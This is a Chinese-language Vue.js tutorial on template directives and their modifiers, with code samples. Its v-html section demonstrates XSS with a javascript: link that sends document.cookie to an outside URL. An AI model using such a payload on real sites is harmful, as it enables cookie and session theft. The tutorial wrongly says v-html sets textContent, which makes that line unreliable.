## 指令

> [vue的修饰符](https://juejin.cn/post/6844903703376297992)

> 注意：Vue 指令统一将 js 代码写在 `" "` 中
>
> 一些指令可以搭配修饰符产生特定效果，语法是 `Vue指令.修饰符="xxx"`，可以连续使用多个修饰符，写法和链式调用一致

### v-text

类型：`string`

功能：用于设置标签元素的 `textContent` 属性，会覆盖直接写在标签中间的文本

```html
<template>
  <div>
    <p v-text="obj.x"></p>              <!-- x -->
    <p v-text="`${obj.x} + y`"></p>     <!-- x + y -->
    <p v-text="1 + 1"></p>              <!-- 2 -->
    <p v-text="1">2</p>                 <!-- 1 -->
  </div>
</template>

<script>
export default {
  name: 'HelloWorld',
  data () {
    return {
      obj: {
        x: 'x'
      }
    }
  }
}
</script>
```



-----

### v-html

类型：`string`

功能：用于设置标签元素的 `textContent` 属性，会覆盖直接写在标签中间的内容

```html
<template>
  <div v-html="ele" />
</template>

<script>
export default {
  name: 'Demo',
  data () {
    return {
      ele: '<span>123</span>'
    }
  }
}
</script>
```

> 有 xss 攻击风险，所以该内容不应该支持用户自定义输入

```html
<template>
  <div>
    <input type="text" v-model="element">
    <button @click="changeEle">模拟输入</button>
    <div v-html="element"/>
  </div>
</template>

<script>
export default {
  name: 'Demo',
  data() {
    return {
      element: ''
    }
  },
  methods: {
    changeEle() {
      this.element = '<a href="javascript:location.href=`http://www.baidu.com?${document.cookie}`">点击跳转截取cookie</a>'
    }
  }
}
document.cookie = 'name=jack'
</script>
```

![](https://raw.githubusercontent.com/magezee/images/main/cookie.gif)



-----

### v-show

类型：`any`

功能：根据表达式判断是否为真，如果为真则正常显示元素，如果为假则添加样式 `display: none` 隐藏

```html
<template>
  <div>
    <p v-show="isShow">active</p>
    <p v-show="!isShow">inactive</p>
  </div>
</template>

<script>
export default {
  name: 'Demo',
  data () {
    return {
      isShow: true
    }
  }
}
</script>
```



-----

### v-if

类型：`any`

功能：根据表达式判断是否为真，如果为真则正常显示元素，如果为假则在 DOM 树上删除该元素

> v-if 触发回流操作，如果需要频繁切换显示隐藏的元素，使用 v-show 比 v-if 性能要好
>
> `<template>` 标签只能配合 v-if 不可配合 v-show

```html
<template>
  <div>
    <p v-if="isShow">active</p>
    <p v-if="!isShow">inactive</p>
  </div>
</template>

<script>
export default {
  name: 'Demo',
  data () {
    return {
      isShow: true
    }
  }
}
</script>
```

**v-else**

类型：无

功能：前一兄弟元素必须有 `v-if` 或 `v-else-if`，为它们添加 else 条件

```html
<template>
  <div>
    <p v-if="isShow">active</p>
    <p v-else>inactive</p>
  </div>
</template>

<script>
export default {
  name: 'Demo',
  data () {
    return {
      isShow: Math.random() > 0.5
    }
  }
}
</script>
```

**v-else-if**

类型：`any`

功能：前一兄弟元素必须有 `v-if` 或 `v-else-if`，为它们添加 else if 条件

```html
<template>
  <div>
    <p v-if="isShow">active</p>
    <p v-else-if="isShow < 0.7">semiactive</p>
    <p v-else>inactive</p>
  </div>
</template>

<script>
export default {
  name: 'Demo',
  data () {
    return {
      isShow: Math.random() > 0.5
    }
  }
}
</script>
```



----

### v-for

类型：`Array | Object | number | string | Iterable`

功能：基于源数据多次渲染元素或模板块，需要配合 `key` 值使用，它的语法是 `item in items `，其取值效果和 `for(let item of items)` 类似

> v-for 和数据进行同步绑定，一旦更改数据，则渲染的标签也会同步更新

```html
<template>
  <ul>
    <li v-for="item in arr" :key="item.id">{{ item.value }}</li>
  </ul>
</template>

<script>
export default {
  name: 'Demo',
  data () {
    return {
      arr: [
        {id: 'A', value: 'A'},
        {id: 'B', value: 'B'},
        {id: 'C', value: 'C'}
      ]
    }
  }
}
</script>
```

> 如果遍历的是数组，则可以通过 `(item, index) in items` 的方式拿到下标
>
> 如果遍历的是对象，则可以通过 `(item, key, index)` 的方式拿到属性名和下标

```html
<template>
  <ul>
    <li v-for="(item, index) in arr" :key="item.id">{{ `${index}：${item.value}` }}</li>
    <li v-for="(item, key, index) in obj" :key="item.id">{{ `${index}:${key}-${item}` }}</li>
  </ul>
</template>

<script>
export default {
  name: 'Demo',
  data () {
    return {
      arr: [
        {id: 'A', value: 'a'},
        {id: 'B', value: 'b'},
        {id: 'C', value: 'c'}
      ],
      obj: {
        X: 'x',
        Y: 'y',
        Z: 'z'
      }
    }
  }
}
</script>
```

![](https://img-blog.csdnimg.cn/a84b19253e344c6ca8623d786015f245.png)



----

### v-on

类型：`Function | Inline Statement | Object`

简写：`@`

功能：为元素绑定事件

> 如果需要传参，写成 `@事件="函数名()"` 的方式，如果不需要则直接写成 `@事件="函数名"` 即可，此时默认传入一个事件对象并调用，相当于  `@事件="函数名(event)"` 

```html
<template>
  <div>
    <button v-on:click="eve('A')">按钮A</button>
    <button @click="eve('B')">按钮B</button>
  </div>
</template>

<script>
export default {
  name: 'Demo',
  data () {
    return {
      info: '点击信息'
    }
  },
  methods: {
    eve (type) {
      alert(type + this.info)
    }
  }
}
</script>
```

![](https://img-blog.csdnimg.cn/ba44510922a84a7db883b6bbabaaa9be.png)

> 事件方法会默认传进一个 evnet 对象，但是使用 `@事件="函数名()"` 的方式会丢失该对象，因此可以使用占位符 `$event` 来接收

```html
<template>
  <div>
    <button @click="handleClickA">按钮A</button>
    <button @click="handleClickB('B', $event)">按钮B</button>
  </div>
</template>

<script>
export default {
  name: 'Demo',
  methods: {
    handleClickA (event) {
      console.log(event.target.textContent)     // 按钮A
    },
    handleClickB (type, event) {
      console.log(event.target.textContent)     // 按钮B
    }
  }
}
</script>
```

**修饰符**

事件修饰符：

- `stop`：阻止事件冒泡
- `prevent`：阻止事件默认行为
- `self`：仅点击元素本身触发，一般给父元素套来阻止冒泡
- `once`：事件仅可触发一次
- `capture`：事件触发从包含该元素的顶层开始往下触发，与冒泡相反
- `passive`：事件默认行为立即执行，无需等待时间回调任务完成，如鼠标滚轮事件用 `wheel` 去处理耗时任务，则会等待任务结束滚动条才滑动，使用该修饰符可以立即滑动
- `native`：将 vue 组件转化为普通 html 元素，使其可以在组件上绑定事件

鼠标按键修饰符：

- `left`：左键点击触发事件
- `right`：右键点击触发事件
- `middle`：中键点击触发事件

键盘按键修饰符：

- `enter`：按下回车键触发事件
- `delete`：按下退格键和删除键触发事件
- `esc`：按下 esc 键触发事件
- `tab`：按下 tab 键触发事件，配合 `keyUp` 事件会有问题，应用 `keyDown`
- `up`、`down`、`left`、`right`：按下方向键触发事件

> 上面是 vue 对常用键的别名，如果想控制其他键可以在事件函数中使用 `event.key` 获取对应的键名，然后用该键名当修饰符（如果是双单词的键名，应该使用小写且用 `-` 连接，如 `KebabCase` 的修饰符应该是 `kebab-case`）
>
> 使用 `keyUp` 事件配合系统修饰键 `ctrl`、`alt`、`shift`、`win`、`command` 键时，需要按下修饰键的同时按下任意其他键，松开其他键事件才触发，使用 `keyDown` 事件正常





-----

### v-bind

类型：`any (with argument) | Object (without argument)`

功能：设置标签属性

简写：`:`

> v-bind 是单向数据绑定，即只能 data 决定属性，更改属性不能更新 data

```html
<template>
  <img v-bind:src="imgUrl" />
  <img :src="imgUrl" />
</template>

<script>
export default {
  name: 'Demo',
  data () {
    return {
      imgUrl: 'https://www.baidu.com/img/PCtm_d9c8750bed0b3c7d089fa7d55720d6cf.png'
    }
  }
}
</script>
```

一般直接往标签中添加属性时，只能添加 string 类型，可以使用该指令来添加变量

```html
<template>
	<p :info="123"></p>			<!-- 传递的是number类型 -->
  <p info="123"></p>	    <!-- 传递的是string类型 -->	
</template>
```

**修饰符**

- `prop`：禁止暴露自定义属性，防止开发者模式查看
- `sync`：



----

### v-model

类型：根据表单控件类型决定

功能：在表单控件或者组件上创建双向绑定，只能在 `<input>` 、`<select>`、`<textarea>` 标签中使用，因为如果不存在输入则无法反向影响 data

> 双向绑定指更改表单属性及 data 对象属性中的任意一个，都会同步更新另外一个
>
> 设置 v-model 会忽略表单元素的 `value` 、`checked` 、`selected` 属性
>
> v-model 可以写成 `v-model:value(或其他属性)="xxx"` 形式，也可以简写为 `v-model="xxx"` 让引擎自动判断

```html
<template>
  <div>
    <input type="text" v-model="info"/>
    <p>{{ info }}</p>
  </div>
</template>

<script>
export default {
  name: 'Demo',
  data () {
    return {
      info: '表单文字'
    }
  }
}
</script>
```

![](https://img-blog.csdnimg.cn/f383244331cd449e8e260f9b318a1646.gif#pic_center)

**修饰符**

- `lazy`：默认在 input 事件触发后数据同步，添加该修饰符可以在 change 事件后才同步，如让输入框在失去焦点后才收集数据，而非实时收集，增加性能
- `number`：将输入的值自动转为数值类型
- `trim`：自动过滤输入的首尾空白符

**表单场景**

简写方式默认读取的是表单的 value 值，对于一些没有输入的表单，如 `radio`、`checkbox` 等需要在标签手动加上 value 属性，且用到多个 checkbox 属性时需要使用数组接收数据

```html
<template>
  <form @submit.prevent="submitData">
    姓名：<input type="text" v-model.trim="formData.name">
    年龄：<input type="text" v-model.number="formData.age">
    性别：
    男<input type="radio" name="sex" v-model="formData.sex" value="male">
    女<input type="radio" name="sex" v-model="formData.sex" value="female">
    技能：
    React<input type="checkbox" v-model="formData.skill" value="react">
    Vue<input type="checkbox" v-model="formData.skill" value="vue">
    Angular<input type="checkbox" v-model="formData.skill" value="angular">
    城市：
    <select v-model="formData.city">
      <option value="">请选择城市</option>
      <option value="beijing">北京</option>
      <option value="shanghai">上海</option>
      <option value="guangzhou">广州</option>
    </select><br />
    其他：
    <textarea v-model.lazy="formData.other"></textarea>
    <button>提交</button>
  </form>
</template>

<script>
export default {
  name: 'Demo',
  data() {
    return {
      formData: {
        name: '',
        age: '',
        sex: '',
        skill: [],
        city: '',
        other: ''
      }
    }
  },
  methods: {
    submitData () {
      const data = JSON.stringify(this.formData)
      alert(data)
      // 提交该数据到后端
    }
  }
}
</script>
```

![](https://raw.githubusercontent.com/magezee/images/main/model1.gif)



-----

### v-cloak

功能：为标签添加该指令时，会保持在元素上直到关联实例结束编译（即 vue 加载完毕后即消失），通常配合 css 的属性选择器来隐藏元素，避免 vue 未加载时在页面上显示 `{{}}` 原始数据

```html
<template>
  <div v-cloak>{{info}}</div>
</template>

<script>
export default {
  name: 'Demo',
  data() {
    return {
      info: 'xxx'
    }
  }
}
</script>

<style scoped>
[v-cloak] {
  display: none;
}
</style>
```



----

### v-once

功能：只渲染该元素和组件一次，之后再更新时，元素或组件自身及所子节点将被视为静态内容并跳过重新渲染，用于优化更新性能

```html
<template>
  <div>
    <p v-once>渲染一次：{{count}}</p>
    <p>重复渲染：{{count}}</p>
    <button @click="add">+1</button>
  </div>
</template>

<script>
export default {
  name: 'Demo',
  data() {
    return {
      count: 0
    }
  },
  methods: {
    add () {
      this.count += 1
    }
  }
}
</script>
```

![](https://raw.githubusercontent.com/magezee/images/main/once.gif)



-----

### v-pre

功能：跳过该元素和子元素的 vue 编译过程，用于显示原始数据，或者大量用在没用到 vue 功能的元素上可以提高性能

```html
<template>
  <div>
    <p v-pre>未使用vue的数据</p>
    <p v-pre>{{info}}</p>
  </div>
</template>

<script>
export default {
  name: 'Demo',
  data() {
    return {
      info: '使用vue的数据'
    }
  }
}
</script>
```

![](https://raw.githubusercontent.com/magezee/images/main/pre.png)
